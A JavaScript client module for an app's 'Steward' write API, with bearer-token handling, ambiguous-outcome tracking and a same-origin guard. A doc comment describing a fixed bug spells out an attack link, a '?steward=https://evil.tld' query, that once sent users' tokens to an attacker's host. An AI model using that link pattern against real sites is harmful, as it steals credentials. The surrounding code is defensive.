const RETRYABLE_STATUSES = new Set([401, 422]);

export class StewardWriteError extends Error {
  constructor(message, { status = null, retryable = false, ambiguous = false, code } = {}) {
    super(message);
    this.name = "StewardWriteError";
    this.status = status;
    this.retryable = retryable;
    this.ambiguous = ambiguous;
    this.code = code || (ambiguous ? "ambiguous_outcome" : "steward_refusal");
  }
}

function nonEmpty(value) {
  return typeof value === "string" && value.trim().length > 0;
}

function normalizedBaseUrl(value) {
  return String(value || "").trim().replace(/\/$/, "");
}

/**
 * Where Steward lives: this origin, unless a developer running vite points somewhere else.
 *
 * Both overrides sit behind `import.meta.env.DEV`, which Vite resolves to `false` at build
 * time, so the branch is eliminated from the bundle and a deployed Arcadia has no `?steward=`
 * to honour. It used to honour it from any link, and the approval prompt hands this client a
 * bearer token — so `https://<origin>/?steward=https://evil.tld` opened in a tab where the
 * token had been entered sent it to whoever wrote the link (warren#256, sibling of #241).
 *
 * `VITE_STEWARD_URL` is gated by the same branch rather than kept for production. It is a
 * build-time value and so not attacker-controlled, but a shipped Arcadia has no honest use
 * for one: deploy/nginx.conf proxies Steward's write routes behind the deployed origin, and
 * a build pointed anywhere else would only meet the refusal below.
 */
export function stewardBaseFromLocation(search = window.location.search) {
  if (!import.meta.env.DEV) return "";
  try {
    return new URLSearchParams(search).get("steward") || import.meta.env.VITE_STEWARD_URL || "";
  } catch {
    return "";
  }
}

/**
 * Is this base the page's own origin?
 *
 * `""` and a bare path are; an absolute or protocol-relative URL is only if its origin
 * matches this one. Anything unparseable is not — a base nobody can resolve is a base
 * nobody should send a credential to.
 */
export function isSameOrigin(base) {
  const value = normalizedBaseUrl(base);
  if (!value) return true;
  const here = globalThis.location?.origin;
  // No document to be same-origin *with* (node, a worker): only a bare path can qualify.
  if (!here || here === "null") return !/^([a-z][a-z0-9+.-]*:)?\/\//i.test(value);
  try {
    return new URL(value, here).origin === here;
  } catch {
    return false;
  }
}

function remoteMessage(body, fallback) {
  return nonEmpty(body?.detail?.message) ? body.detail.message : fallback;
}

const operations = {
  job: (body) => ({
    path: "/jobs", body, status: 202,
    reconcilesAmbiguous: (receipt) => nonEmpty(receipt?.task_id),
    accepts: (receipt) => receipt?.status === "accepted" && nonEmpty(receipt.request_id) && nonEmpty(receipt.task_id),
    confirms: (receipt, snapshot) => nonEmpty(receipt?.task_id) && snapshot?.tasks?.some((task) => task.id === receipt.task_id),
  }),
  routine: (residentId, routineId) => ({
    path: `/residents/${encodeURIComponent(residentId)}/routines/${encodeURIComponent(routineId)}/run`,
    status: 202,
    reconcilesAmbiguous: () => false,
    accepts: (receipt) => receipt?.status === "accepted" && nonEmpty(receipt.request_id) && receipt.resident === residentId && receipt.routine === routineId,
    confirms: (_receipt, snapshot, baseline) => {
      const oldIds = new Set(baseline?.routines?.map((run) => run.run_id));
      return snapshot?.routines?.some((run) => !oldIds.has(run.run_id) &&
        run.routine === routineId && run.trigger === "manual" && run.agent_id?.endsWith(`:${residentId}`));
    },
  }),
  approval: (requestId, body) => ({
    path: `/approvals/${encodeURIComponent(requestId)}`, body, status: 202,
    reconcilesAmbiguous: () => true,
    accepts: (receipt) => receipt?.status === "recorded" && nonEmpty(receipt.request_id) && receipt.approval_request_id === requestId && receipt.decision === body.decision,
    confirms: (_receipt, snapshot) => snapshot?.approvals?.some((approval) =>
      approval.request_id === requestId && approval.state === "resolved" && approval.decision === body.decision),
  }),
  resident: (body) => ({
    path: "/residents", body, status: 201,
    reconcilesAmbiguous: () => true,
    accepts: (receipt) => receipt?.status === "accepted" && nonEmpty(receipt.request_id) &&
      receipt.id === body.id && typeof receipt.changed === "boolean",
    confirms: (receipt, snapshot, baseline) => {
      const oldIds = new Set(baseline?.villagers?.map((villager) => villager.id));
      return receipt?.changed === false || snapshot?.villagers?.some((villager) =>
        !oldIds.has(villager.id) && villager.id?.endsWith(`:${body.id}`));
    },
  }),
};

export function createStewardClient({ baseUrl = "", fetch: fetchImpl = fetch } = {}) {
  let credentials = null;
  let writeState = null;
  let latestSnapshot = null;

  async function write(operation) {
    // Defence in depth for warren#256, and deliberately the first thing here: refusing
    // before `writeState` is touched means a refused base cannot park an unresolved write
    // and block every later one. `import.meta.env.DEV` is `false` in every built bundle, so
    // what ships refuses unconditionally; the escape is only for a human running vite, whose
    // dev server proxies Burrow but not Steward.
    if (!import.meta.env.DEV && !isSameOrigin(baseUrl)) {
      throw new StewardWriteError(
        `Refusing to send Steward credentials to ${normalizedBaseUrl(baseUrl)}: that is not this origin`,
        { code: "cross_origin_base" },
      );
    }
    if (!credentials) throw new StewardWriteError("Steward credentials are required", { code: "credentials_required" });
    if (writeState) throw new StewardWriteError("A Steward write is already unresolved", { code: "write_blocked" });

    writeState = { state: "sending", operation, baseline: latestSnapshot };
    let response;
    try {
      response = await fetchImpl(`${normalizedBaseUrl(baseUrl)}${operation.path}`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${credentials.token}`,
          ...(operation.body === undefined ? {} : { "Content-Type": "application/json" }),
        },
        ...(operation.body === undefined ? {} : { body: JSON.stringify(operation.body) }),
      });
    } catch {
      writeState = { ...writeState, state: "ambiguous" };
      throw new StewardWriteError("Steward could not be reached; the write outcome is unknown", { ambiguous: true });
    }

    let receipt = null;
    try { receipt = await response.json(); } catch { /* unreadable is ambiguous */ }

    if (RETRYABLE_STATUSES.has(response.status)) {
      writeState = null;
      if (response.status === 401) credentials = null;
      throw new StewardWriteError(remoteMessage(receipt, `Steward refused the write (${response.status})`), {
        status: response.status, retryable: true,
      });
    }
    if (response.status !== operation.status || !operation.accepts(receipt)) {
      writeState = { ...writeState, state: "ambiguous", receipt };
      throw new StewardWriteError(remoteMessage(receipt, "Steward returned an ambiguous write outcome"), {
        status: response.status, ambiguous: true,
      });
    }

    writeState = { ...writeState, state: "awaiting_confirmation", receipt };
    return { state: "awaiting_confirmation", receipt };
  }

  return {
    setCredentials(next) { credentials = nonEmpty(next?.token) ? { token: next.token } : null; },
    clearCredentials() { credentials = null; },
    postJob: (body) => write(operations.job(body)),
    runRoutine: (residentId, routineId) => write(operations.routine(residentId, routineId)),
    decideApproval: (requestId, body) => write(operations.approval(requestId, body)),
    createResident: (body) => write(operations.resident(body)),
    confirm(snapshot) {
      const confirmable = writeState?.state === "awaiting_confirmation" ||
        (writeState?.state === "ambiguous" &&
          writeState.operation.reconcilesAmbiguous(writeState.receipt));
      const resolved = confirmable &&
        writeState.operation.confirms(writeState.receipt, snapshot, writeState.baseline);
      latestSnapshot = snapshot;
      if (resolved) writeState = null;
      return Boolean(resolved);
    },
  };
}
